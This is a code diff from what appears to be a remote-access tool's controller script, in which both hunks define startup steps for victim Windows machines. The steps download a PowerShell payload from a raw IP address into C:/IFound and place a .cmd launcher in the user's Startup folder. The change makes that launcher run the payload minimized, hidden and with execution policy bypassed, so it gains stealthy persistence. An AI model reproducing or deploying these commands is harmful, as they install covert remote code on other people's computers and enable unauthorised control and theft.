@@ -27,7 +27,7 @@ macros = {
     "startup": {"args": [], "steps": [
             "if (Test-Path 'C:/IFound') {} else { mkdir C:/IFound; } Invoke-WebRequest -Uri 'http://176.58.105.100:8080/raa.ps1' -OutFile 'C:/IFound/mogus.ps1'",
             "cd '~/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup'",
-            "Write-Output 'powerShell -windowstyle hidden C:/IFound/mogus.ps1' | Out-File ifound.cmd -encoding ASCII",
+            "Write-Output 'cmd /c start /min \"\"  Powershell.exe -ExecutionPolicy ByPass -windowstyle hidden -File \"C:/IFound/mogus.ps1\"' | Out-File ifound.cmd -encoding ASCII",
             "cd ~"
         ]},
     "discord-message": {"args": ["to", "message"], "steps": [
@@ -60,7 +60,7 @@ def client_handler(connection):
         startup_steps = [
             "if (Test-Path 'C:/IFound') {} else { mkdir C:/IFound; } Invoke-WebRequest -Uri 'http://176.58.105.100:8080/raa.ps1' -OutFile 'C:/IFound/mogus.ps1'",
             "cd '~/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup'",
-            "Write-Output 'powerShell -windowstyle hidden C:/IFound/mogus.ps1' | Out-File ifound.cmd -encoding ASCII",
+            "Write-Output 'cmd /c start /min \"\"  Powershell.exe -ExecutionPolicy ByPass -windowstyle hidden -File \"C:/IFound/mogus.ps1\"' | Out-File ifound.cmd -encoding ASCII",
         ]
         for step in startup_steps:
             try:
